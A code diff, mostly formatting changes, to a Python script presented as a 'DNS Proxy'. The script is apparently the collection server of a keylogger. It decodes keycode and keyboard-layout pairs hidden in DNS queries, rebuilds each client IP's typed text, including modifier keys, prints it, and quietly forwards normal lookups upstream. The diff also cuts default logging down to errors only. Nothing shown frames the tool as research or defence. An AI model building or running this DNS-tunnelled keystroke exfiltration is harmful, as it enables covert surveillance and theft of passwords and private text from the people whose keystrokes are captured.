@@ -2,8 +2,8 @@ import argparse
 import os
 import socket
 import time
-import yaml
 
+import yaml
 from dnslib import QTYPE, RCODE, DNSRecord
 from dnslib.server import BaseResolver, DNSHandler, DNSLogger, DNSServer
 
@@ -11,7 +11,9 @@ qw_key_map = yaml.safe_load(open("qwerty.yml"))
 az_key_map = yaml.safe_load(open("azerty.yml"))
 key_maps = {0: qw_key_map, 1: az_key_map}
 
-mods_str_rep = {k: {v["keys"][mod]:mod for mod in v["mod"]} for k,v in key_maps.items() }
+mods_str_rep = {
+    k: {v["keys"][mod]: mod for mod in v["mod"]} for k, v in key_maps.items()
+}
 keys = {}
 PAYLOAD_LEN = int(os.environ["PAYLOAD_LEN"])
 
@@ -30,9 +32,13 @@ class ProxyResolver(BaseResolver):
                 reply.header.rcode = RCODE.NXDOMAIN
             else:
                 if handler.protocol == "udp":
-                    proxy_r = request.send(self.address, self.port, timeout=self.timeout)
+                    proxy_r = request.send(
+                        self.address, self.port, timeout=self.timeout
+                    )
                 else:
-                    proxy_r = request.send(self.address, self.port, tcp=True, timeout=self.timeout)
+                    proxy_r = request.send(
+                        self.address, self.port, tcp=True, timeout=self.timeout
+                    )
                 reply = DNSRecord.parse(proxy_r)
         except socket.timeout:
             reply = request.reply()
@@ -53,10 +59,17 @@ class PassthroughDNSHandler(DNSHandler):
             key_events = zip(payload[::2], payload[1::2])
             for layout, code in key_events:
                 if key_map := key_maps.get(layout):
-                    if len(keys[client_ip]) >0 and keys[client_ip][-1] in mods_str_rep[layout]:
-                        last_mod_str= keys[client_ip].pop()
-                        mod = mods_str_rep[layout][last_mod_str ]
-                        keys[client_ip].append(key_map["mod"][mod].get(code, f"{last_mod_str} {key_map['keys'].get(code, '')} "))
+                    if (
+                        len(keys[client_ip]) > 0
+                        and keys[client_ip][-1] in mods_str_rep[layout]
+                    ):
+                        last_mod_str = keys[client_ip].pop()
+                        mod = mods_str_rep[layout][last_mod_str]
+                        keys[client_ip].append(
+                            key_map["mod"][mod].get(
+                                code, f"{last_mod_str} {key_map['keys'].get(code, '')} "
+                            )
+                        )
                     else:
                         keys[client_ip].append(key_map["keys"].get(code, ""))
 
@@ -64,9 +77,9 @@ class PassthroughDNSHandler(DNSHandler):
             for client_ip, k in keys.items():
                 res[client_ip] = "".join(k)
             os.system("clear")
-            for c,k in res.items():
+            for c, k in res.items():
                 print(f"{c}: {k}")
-            
+
         except Exception as e:
             print(e)
             pass
@@ -98,7 +111,12 @@ def send_udp(data, host, port):
 if __name__ == "__main__":
     p = argparse.ArgumentParser(description="DNS Proxy")
     p.add_argument(
-        "--port", "-p", type=int, default=53, metavar="<port>", help="Local proxy port (default:53)"
+        "--port",
+        "-p",
+        type=int,
+        default=53,
+        metavar="<port>",
+        help="Local proxy port (default:53)",
     )
     p.add_argument(
         "--address",
@@ -114,11 +132,11 @@ if __name__ == "__main__":
         metavar="<dns server:port>",
         help="Upstream DNS server:port (default:8.8.8.8:53)",
     )
-     
+
     p.add_argument(
         "--log",
-        default="request,reply,truncated,error",
-        help="Log hooks to enable (default: +request,+reply,+truncated,+error,-recv,-send,-data)",
+        default="error",
+        help="Log hooks to enable (default: +error)",
     )
 
     args = p.parse_args()
